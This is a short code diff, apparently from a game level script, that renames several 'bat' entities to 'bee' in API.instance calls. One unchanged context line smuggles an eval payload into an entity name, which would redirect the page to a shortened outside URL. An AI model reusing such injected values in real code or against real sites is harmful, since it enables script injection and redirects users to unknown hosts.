@@ -51,8 +51,8 @@ API.instance("barrel", 36, 56);
 API.instance("alice", 86, 54);
 API.instance("$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');", 81, 36);
 
-API.instance("bat", 104, 46);
-API.instance("bat", 119, 26);
-API.instance("bat", 40, 68);
-API.instance("bat", 20, 47);
-API.instance("bat", 16, 95);
+API.instance("bee", 104, 46);
+API.instance("bee", 119, 26);
+API.instance("bee", 40, 68);
+API.instance("bee", 20, 47);
+API.instance("bee", 16, 95);
